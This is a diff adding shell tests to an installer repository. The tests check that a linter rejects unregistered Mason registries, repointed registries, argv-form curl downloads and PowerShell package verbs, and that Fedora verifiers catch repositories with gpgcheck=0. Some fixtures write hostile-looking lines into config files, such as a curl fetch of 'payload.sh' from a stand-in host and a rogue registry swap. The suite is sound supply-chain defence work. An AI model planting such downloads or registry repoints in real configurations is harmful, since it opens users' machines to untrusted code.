@@ -393,6 +393,129 @@ git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
 lint_fixture >/dev/null
 printf 'PASS: the tap this repository does use is covered by its own row\n'
 
+# PS-04. A Mason registry is a trust root of the same kind: every LSP server
+# and debug adapter Mason installs is resolved through the configured lists,
+# and one of this repository's two is a personal fork. Both were declared in
+# the registry already, and nothing detected adding, repointing or losing one.
+cat >>"$fixture_repo/common/bootstrap-mason.lua" <<'EOF'
+
+require("mason").setup({
+  registries = {
+    "github:rogueowner/mason-registry",
+  },
+})
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an unregistered Mason registry.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'common/bootstrap-mason.lua:'
+assert_contains "$lint_output" 'unregistered package-registry network source'
+git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
+lint_fixture >/dev/null
+printf 'PASS: an unregistered Mason registry fails the linter\n'
+
+# A `github:owner/repo` reference names no host either, so the same rule has
+# to read the repository it names. Repointing one of the two declared
+# registries keeps its annotation and must still be refused, which is the case
+# that matters: a repoint is a one-word edit.
+sed -i 's|"github:Crashdummyy/mason-registry"|"github:rogueowner/mason-registry"|' \
+  "$fixture_repo/common/bootstrap-mason.lua"
+if lint_output="$(lint_fixture)"; then
+  printf "The linter let a registry's annotation cover a different one.\n" >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'github:rogueowner/mason-registry'
+assert_contains "$lint_output" 'https://github.com/rogueowner/mason-registry'
+git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
+lint_fixture >/dev/null
+printf 'PASS: a package registry is covered only by the source that is that repository\n'
+
+# And losing the row leaves the declaration behind, which is the direction
+# that made the tracked inventory quietly wrong.
+sed -i '/^mason-registry-crashdummyy\t/d' "$fixture_repo/config/network-sources.tsv"
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted a declaration whose registry row was deleted.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" "unknown network-source id 'mason-registry-crashdummyy'"
+git -C "$fixture_repo" checkout -q -- config/network-sources.tsv
+lint_fixture >/dev/null
+printf 'PASS: deleting a registry row fails the declaration that names it\n'
+
+# A download written as an argument vector rather than a command line. The git
+# form was covered and this one was not, so `vim.fn.system({ "curl", ... })`
+# in a Lua file reached the network with nothing to flag it.
+cat >>"$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/dotnet.lua" <<'EOF'
+
+vim.fn.system({ "curl", "-fsSL", "https://example.invalid/payload.sh" })
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an argv-form curl download.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered curl network source'
+git -C "$fixture_repo" checkout -q -- nvim-lazyvim/.config/nvim/lua/plugins/dotnet.lua
+lint_fixture >/dev/null
+printf 'PASS: an argv-form curl download fails the linter\n'
+
+# A PowerShell package verb resolves a name against a configured repository and
+# runs what comes back, so the repository is a trust root and the module is
+# code. The CI job that installs PSScriptAnalyzer carried its annotation with
+# no pattern holding it there, so deleting the annotation changed nothing.
+sed -i '/network-source: psscriptanalyzer/d' "$fixture_repo/.github/workflows/validate.yml"
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an Install-Module with its annotation removed.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" '.github/workflows/validate.yml:'
+assert_contains "$lint_output" 'unregistered powershell-package network source'
+git -C "$fixture_repo" checkout -q -- .github/workflows/validate.yml
+lint_fixture >/dev/null
+printf 'PASS: an unannotated PowerShell package verb fails the linter\n'
+
+# And the other verbs of the same family, in a file that never had one.
+cat >"$fixture_repo/platforms/windows/scratch.ps1" <<'EOF'
+Register-PSRepository -Name Private -SourceLocation https://example.invalid/feed
+Save-Module -Name Anything -Path C:\tmp
+Install-PSResource -Name Anything
+EOF
+git -C "$fixture_repo" add -A
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an unregistered PowerShell package verb.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'platforms/windows/scratch.ps1:1'
+assert_contains "$lint_output" 'platforms/windows/scratch.ps1:2'
+assert_contains "$lint_output" 'platforms/windows/scratch.ps1:3'
+rm -f -- "$fixture_repo/platforms/windows/scratch.ps1"
+git -C "$fixture_repo" add -A
+lint_fixture >/dev/null
+printf 'PASS: every PowerShell package verb of the family is flagged\n'
+
+# The walk that finds an annotation above a continued construct stops at the
+# first line of code, and a list element is not a continuation of the one
+# above it. Otherwise a registry appended under an annotated one would inherit
+# its provenance, which is what the tap work closed for downloads.
+cat >>"$fixture_repo/common/bootstrap-mason.lua" <<'EOF'
+
+require("mason").setup({
+  registries = {
+    -- network-source: mason-registry
+    "github:mason-org/mason-registry",
+    "github:rogueowner/mason-registry",
+  },
+})
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter let a registry inherit the annotation of the one above it.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered package-registry network source'
+git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
+lint_fixture >/dev/null
+printf 'PASS: a registry listed under an annotated one inherits nothing\n'
+
 # An annotation belongs to the construct it introduces, not to whatever is
 # written under that one. This is the same file appended to twice: the second
 # download inherits nothing from the first one's annotation.
@@ -736,6 +859,241 @@ run_terra_verify false 90 1 "$terra_pinned_fpr"
 assert_failure
 assert_contains "$TEST_OUTPUT" 'terra-release is not installed'
 printf 'PASS: the verifier fails when terra-release is not installed\n'
+
+# --- Every repository this installer adds is re-checked after install -------
+
+# SEC-03. Only Terra had a post-install trust-root check. Every bootstrap here
+# returns early for good once its repository exists, so a repository shipped
+# or later edited with gpgcheck=0 keeps installing root-privileged packages
+# unchecked, and the verifier that would have said so covered one of three.
+
+trust_bin="$test_root/trust-bin"
+trust_state="$test_root/trust-state"
+mkdir -p "$trust_bin"
+
+# A repository DNF knows about is one with a repo-<id> state file holding its
+# gpgcheck value; anything else is a repository DNF has never heard of.
+cat >"$trust_bin/dnf" <<'EOF'
+#!/usr/bin/env bash
+if [[ "${1:-}" == --dump-repo-config=* ]]; then
+  repo="${1#--dump-repo-config=}"
+  [[ -r "$MOCK_STATE/repo-$repo" ]] || exit 1
+  value="$(cat "$MOCK_STATE/repo-$repo")"
+  printf '======== "%s" repository configuration: ========\n' "$repo"
+  printf 'gpgcheck = %s\npkg_gpgcheck = %s\n' "$value" "$value"
+  exit 0
+fi
+printf 'dnf %s\n' "$*" >>"$MOCK_LOG"
+EOF
+cat >"$trust_bin/rpm" <<'EOF'
+#!/usr/bin/env bash
+case "${1:-}" in
+-q) [[ -e "$MOCK_STATE/pkg-$2" ]] ;;
+-ql)
+  [[ -e "$MOCK_STATE/pkg-$2" ]] || exit 1
+  cat "$MOCK_STATE/pkg-$2"
+  ;;
+'-E') printf '%s\n' "$MOCK_RELEASEVER" ;;
+--import*) printf 'rpm %s\n' "$*" >>"$MOCK_LOG" ;;
+*) exit 64 ;;
+esac
+EOF
+cat >"$trust_bin/sudo" <<'EOF'
+#!/usr/bin/env bash
+printf 'sudo %s\n' "$*" >>"$MOCK_LOG"
+exec "$@"
+EOF
+chmod +x "$trust_bin"/*
+
+trust_log="$test_root/trust-commands.log"
+
+# reset_trust_state: an empty machine, then the caller declares what it has.
+reset_trust_state() {
+  rm -rf -- "$trust_state"
+  mkdir -p "$trust_state"
+  : >"$trust_log"
+}
+
+# declare_repo <dnf id> <gpgcheck value>
+declare_repo() {
+  printf '%s\n' "$2" >"$trust_state/repo-$1"
+}
+
+# declare_rpm_fusion <variant> <repo id>...: the release package, and the repo
+# files it owns, each naming its repositories the way a real one does.
+declare_rpm_fusion() {
+  local variant="$1" repo_dir="$trust_state/yum.repos.d" id
+  shift
+  mkdir -p "$repo_dir"
+  printf '%s/rpmfusion-%s.repo\n' "$repo_dir" "$variant" \
+    >"$trust_state/pkg-rpmfusion-$variant-release"
+  : >"$repo_dir/rpmfusion-$variant.repo"
+  for id in "$@"; do
+    printf '[%s]\nname=RPM Fusion\n\n' "$id" >>"$repo_dir/rpmfusion-$variant.repo"
+  done
+}
+
+# run_trust <verifier function>: the verifier half, read-only. The cases below
+# assert MOCK_LOG stays empty, so a check that reaches for sudo is caught
+# rather than trusted.
+# shellcheck disable=SC2016 # $1 and $2 are the inner shell's arguments.
+run_trust() {
+  run_capture env PATH="$trust_bin:$PATH" \
+    MOCK_LOG="$trust_log" MOCK_STATE="$trust_state" MOCK_RELEASEVER=90 \
+    TERRA_KEY_MANIFEST="$terra_manifest" \
+    TAILSCALE_REPO_FILE="$trust_state/tailscale.repo" \
+    DNF_REPO_DIR="$trust_state/yum.repos.d" \
+    bash -c '
+      set -u
+      source "$1/common/lib/common.sh"
+      source "$1/common/lib/verify.sh"
+      source "$1/platforms/fedora/lib/fedora.sh"
+      source "$1/platforms/fedora/lib/tailscale.sh"
+      "$2"
+      finish_verification "Trust roots"
+    ' _ "$repo_root" "$1" </dev/null
+}
+
+reset_trust_state
+run_trust verify_tailscale_trust_root
+assert_success
+assert_not_contains "$TEST_OUTPUT" 'tailscale repository'
+printf 'PASS: the Tailscale trust-root check is silent without the repository\n'
+
+reset_trust_state
+: >"$trust_state/tailscale.repo"
+declare_repo tailscale 1
+run_trust verify_tailscale_trust_root
+assert_success
+assert_contains "$TEST_OUTPUT" 'tailscale repository enforces package signatures'
+assert_file_empty "$trust_log"
+printf 'PASS: an installed Tailscale repository is checked, read-only\n'
+
+reset_trust_state
+: >"$trust_state/tailscale.repo"
+declare_repo tailscale 0
+run_trust verify_tailscale_trust_root
+assert_failure
+assert_contains "$TEST_OUTPUT" 'gpgcheck = 0'
+assert_contains "$TEST_OUTPUT" 'Tailscale packages install without signature verification'
+printf 'PASS: a Tailscale repository with gpgcheck=0 fails the verifier\n'
+
+reset_trust_state
+run_trust verify_rpm_fusion_trust_root
+assert_success
+assert_contains "$TEST_OUTPUT" 'no RPM Fusion repositories on this machine'
+printf 'PASS: absent RPM Fusion repositories are reported, not passed over\n'
+
+reset_trust_state
+declare_rpm_fusion free rpmfusion-free rpmfusion-free-updates
+declare_rpm_fusion nonfree rpmfusion-nonfree rpmfusion-nonfree-updates
+for rpm_fusion_repo in rpmfusion-free rpmfusion-free-updates \
+  rpmfusion-nonfree rpmfusion-nonfree-updates; do
+  declare_repo "$rpm_fusion_repo" 1
+done
+run_trust verify_rpm_fusion_trust_root
+assert_success
+for rpm_fusion_repo in rpmfusion-free rpmfusion-free-updates \
+  rpmfusion-nonfree rpmfusion-nonfree-updates; do
+  assert_contains "$TEST_OUTPUT" \
+    "$rpm_fusion_repo repository enforces package signatures"
+done
+printf 'PASS: every repository the RPM Fusion release packages own is checked\n'
+
+# The updates repository is where later packages actually come from, so a hole
+# there is the one that matters and the one a base-repository-only check would
+# have reported clean.
+declare_repo rpmfusion-free-updates 0
+run_trust verify_rpm_fusion_trust_root
+assert_failure
+assert_contains "$TEST_OUTPUT" 'rpmfusion-free-updates repository has gpgcheck = 0'
+printf 'PASS: gpgcheck=0 in an RPM Fusion updates repository fails the verifier\n'
+
+reset_trust_state
+declare_rpm_fusion free rpmfusion-free
+declare_repo rpmfusion-free 1
+run_trust verify_rpm_fusion_trust_root
+assert_failure
+assert_contains "$TEST_OUTPUT" 'rpmfusion-nonfree-release is not installed while its sibling is'
+printf 'PASS: one RPM Fusion half without the other is reported\n'
+
+# --- RPM Fusion is bootstrapped against keys Fedora itself signed -----------
+
+# The two release RPMs are what install the keys every later RPM Fusion
+# package is checked against, so nothing verified them: localpkg_gpgcheck is
+# off by default and Fedora's keyring carries no RPM Fusion key. One
+# successful interception of mirrors.rpmfusion.org over the install window
+# left a permanent, self-consistent trust root behind.
+rpm_fusion_keys="$test_root/rpm-fusion-keys"
+
+# run_rpm_fusion_bootstrap: the installer half, with the key directory pointed
+# at a fixture so no package has to be installed to exercise it.
+# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
+run_rpm_fusion_bootstrap() {
+  run_capture env PATH="$trust_bin:$PATH" \
+    MOCK_LOG="$trust_log" MOCK_STATE="$trust_state" MOCK_RELEASEVER=90 \
+    TERRA_KEY_MANIFEST="$terra_manifest" \
+    RPM_FUSION_KEY_DIR="$rpm_fusion_keys" \
+    bash -c '
+      set -uo pipefail
+      source "$1/common/lib/common.sh"
+      source "$1/platforms/fedora/lib/fedora.sh"
+      ensure_rpm_fusion_repositories
+    ' _ "$repo_root" </dev/null
+}
+
+reset_trust_state
+rm -rf -- "$rpm_fusion_keys"
+mkdir -p "$rpm_fusion_keys"
+: >"$trust_state/pkg-distribution-gpg-keys"
+printf 'key\n' >"$rpm_fusion_keys/RPM-GPG-KEY-rpmfusion-free-fedora-90"
+printf 'key\n' >"$rpm_fusion_keys/RPM-GPG-KEY-rpmfusion-nonfree-fedora-90"
+run_rpm_fusion_bootstrap
+assert_success
+assert_file_contains "$trust_log" 'RPM-GPG-KEY-rpmfusion-free-fedora-90'
+assert_file_contains "$trust_log" 'RPM-GPG-KEY-rpmfusion-nonfree-fedora-90'
+assert_file_contains "$trust_log" 'localpkg_gpgcheck=1'
+assert_eq 'sudo rpm --import' "$(head -n1 "$trust_log" | cut -d' ' -f1-3)" \
+  'the keys must be imported before the release packages are installed'
+printf 'PASS: the RPM Fusion release packages are installed against imported keys\n'
+
+reset_trust_state
+rm -rf -- "$rpm_fusion_keys"
+mkdir -p "$rpm_fusion_keys"
+: >"$trust_state/pkg-distribution-gpg-keys"
+run_rpm_fusion_bootstrap
+assert_failure
+assert_contains "$TEST_OUTPUT" 'No reviewed RPM Fusion free signing key for Fedora 90'
+assert_file_empty "$trust_log"
+printf 'PASS: a missing reviewed key refuses the bootstrap instead of falling back\n'
+
+# --- A repository cannot be added without a verifier ------------------------
+
+# The registry id and the id DNF knows the repository by are not the same
+# string, so the pairing is written out; adding a fourth rpm-repo row fails
+# here until both halves exist. fedora-os-repos is the one row with no entry:
+# it is the distribution's own set, configured by the Fedora installation
+# rather than by anything in this repository.
+verified_repo_pairs=(terra-repo:terra tailscale-repo:tailscale)
+unchecked_repos=''
+while IFS= read -r registry_id; do
+  [[ -n "$registry_id" && "$registry_id" != fedora-os-repos ]] || continue
+  dnf_repo_id=''
+  for pair in "${verified_repo_pairs[@]}"; do
+    [[ "${pair%%:*}" == "$registry_id" ]] || continue
+    dnf_repo_id="${pair#*:}"
+  done
+  if [[ -z "$dnf_repo_id" ]]; then
+    unchecked_repos+="${unchecked_repos:+, }$registry_id (no verifier)"
+    continue
+  fi
+  grep -rqF "verify_repo_trust_root $dnf_repo_id " "$repo_root/platforms" ||
+    unchecked_repos+="${unchecked_repos:+, }$registry_id (never verified)"
+done < <(awk -F'\t' 'NR > 1 && $4 == "rpm-repo" { print $1 }' \
+  "$repo_root/config/network-sources.tsv")
+assert_eq '' "$unchecked_repos" \
+  'every rpm-repo this installer adds must be re-checked after install'
+printf 'PASS: every registered package repository has a post-install check\n'
 
 # --- Bounded fetch behaviour ------------------------------------------------
 
